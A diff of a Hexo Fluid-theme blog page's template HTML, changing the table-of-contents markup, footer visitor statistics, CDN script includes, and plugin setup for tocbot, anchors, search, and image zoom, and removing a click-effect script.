-    <p class="h4"><i class="far fa-list-alt"></i>&nbsp;目录</p>
-    <div id="tocbot"></div>
-  </div>
-
-    </div>
-  </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
 </div>
 
-<!-- custom -->
-
-
-<!-- Comments -->
-<div class="col-lg-7 mx-auto nopadding-md">
-  <div class="container comments mx-auto" id="comments">
+      </div>
     
   </div>
 </div>
+
+<!-- Custom -->
+
 
     
   </main>
 
   
-    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
-      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
     </a>
   
 
@@ -579,92 +670,100 @@ io.interactive()</code></pre>
 </div>
   
 
-  <footer class="mt-5">
-  <div class="text-center py-3">
-    <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
-    <i class="iconfont icon-love"></i>
-    <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
-    <br>
-
-    
   
-    <!-- 不蒜子统计PV -->
-    
-    &nbsp;<span id="busuanzi_container_site_pv"></span>总访问量 
-          <span id="busuanzi_value_site_pv"></span> 次&nbsp;
-  
-  
-    <!-- 不蒜子统计UV -->
-    
-    &nbsp;<span id="busuanzi_container_site_uv"></span>总访客数 
-            <span id="busuanzi_value_site_uv"></span> 人&nbsp;
-  
-  <br>
 
-
-
-    
-
-
-    <!-- cnzz Analytics icon -->
-    
-
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
   </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- LeanCloud 统计PV -->
+        <span id="leancloud-site-pv-container" style="display: none">
+            总访问量 
+            <span id="leancloud-site-pv"></span>
+             次
+          </span>
+      
+      
+        <!-- LeanCloud 统计UV -->
+        <span id="leancloud-site-uv-container" style="display: none">
+            总访客数 
+            <span id="leancloud-site-uv"></span>
+             人
+          </span>
+      
+
+    
+  </div>
+
+
+  
+
+  
 </footer>
 
 <!-- SCRIPTS -->
-<script src="/lib/jquery/jquery.min.js" ></script>
-<script src="/lib/popper/popper.min.js" ></script>
-<script src="/lib/bootstrap/js/bootstrap.min.js" ></script>
-<script src="/lib/mdbootstrap/js/mdb.min.js" ></script>
-<script src="/js/main.js" ></script>
-
-
-  <script src="/js/lazyload.js" ></script>
-
-
-
-  
-    <script src="/lib/tocbot/tocbot.min.js" ></script>
-  
-  <script src="/js/post.js" ></script>
-
-
-
-  <script src="/lib/smoothscroll/SmoothScroll.min.js" ></script>
-
-
-
-  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
-
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
 
 <!-- Plugins -->
 
 
   
-
-  
-
-  
-
-  
-
-  <!-- cnzz Analytics -->
+    <script  src="/js/lazyload.js" ></script>
   
 
 
 
-  <script src="/lib/prettify/prettify.min.js" ></script>
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
   <script>
     $(document).ready(function () {
-      $('pre').addClass('prettyprint  linenums');
-      prettyPrint();
-    })
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
   </script>
 
 
 
-  <script src="/lib/typed/typed.min.js" ></script>
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
   <script>
     var typed = new Typed('#subtitle', {
       strings: [
@@ -684,11 +783,13 @@ io.interactive()</code></pre>
 
 
 
-  <script src="/lib/anchor/anchor.min.js" ></script>
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
   <script>
     anchors.options = {
-      placement: "right",
-      visible: "false",
+      placement: "left",
+      visible: "hover",
+      
+      icon: "#"
       
     };
     var el = "h1,h2,h3,h4,h5,h6".split(",");
@@ -701,25 +802,27 @@ io.interactive()</code></pre>
 
 
 
-  <script src="/js/local-search.js" ></script>
+  <script  src="/js/local-search.js" ></script>
   <script>
     var path = "/local-search.xml";
     var inputArea = document.querySelector("#local-search-input");
     inputArea.onclick = function () {
-      getSearchFile(path);
+      searchFunc(path, 'local-search-input', 'local-search-result');
       this.onclick = null
     }
   </script>
 
 
 
-  <script src="/lib/fancybox/jquery.fancybox.min.js" ></script>
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
   <script>
-    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
       function () {
-        var element = document.createElement("a");
-        $(element).attr("data-fancybox", "images");
-        $(element).attr("href", $(this).attr("src"));
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
         $(this).wrap(element);
       }
     );
@@ -729,58 +832,24 @@ io.interactive()</code></pre>
 
 
 
-  
-  
-    <script type="text/javascript">
-      //定义获取词语下标
-      var a_idx = 0;
-      jQuery(document).ready(function ($) {
-        //点击body时触发事件
-        $("body").click(function (e) {
-          //需要显示的词语
-          var a = new Array("富强", "民主", "文明", "和谐", "自由", "平等", "公正", "法治", "爱国", "敬业", "诚信", "友善");
-          //设置词语给span标签
-          var $i = $("<span/>").text(a[a_idx]);
-          //下标等于原来下标+1  余 词语总数
-          a_idx = (a_idx + 1) % a.length;
-          //获取鼠标指针的位置，分别相对于文档的左和右边缘。
-          //获取x和y的指针坐标
-          var x = e.pageX, y = e.pageY;
-          //在鼠标的指针的位置给$i定义的span标签添加css样式
-          $i.css({
-            "z-index": 999,
-            "top": y - 20,
-            "left": x,
-            "position": "absolute",
-            "font-weight": "bold",
-            "color": rand_color()
-          });
-          // 随机颜色
-          function rand_color() {
-            return "rgb(" + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + ")"
-          }
-          //在body添加这个标签
-          $("body").append($i);
-          //animate() 方法执行 CSS 属性集的自定义动画。
-          //该方法通过CSS样式将元素从一个状态改变为另一个状态。CSS属性值是逐渐改变的，这样就可以创建动画效果。
-          //详情请看http://www.w3school.com.cn/jquery/effect_animate.asp
-          $i.animate({
-            //将原来的位置向上移动180
-            "top": y - 180,
-            "opacity": 0
-            //1500动画的速度
-          }, 1500, function () {
-            //时间到了自动删除
-            $i.remove();
-          });
-        });
-      })
-      ;
-    </script>
-  
 
 
 
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
 
 
 
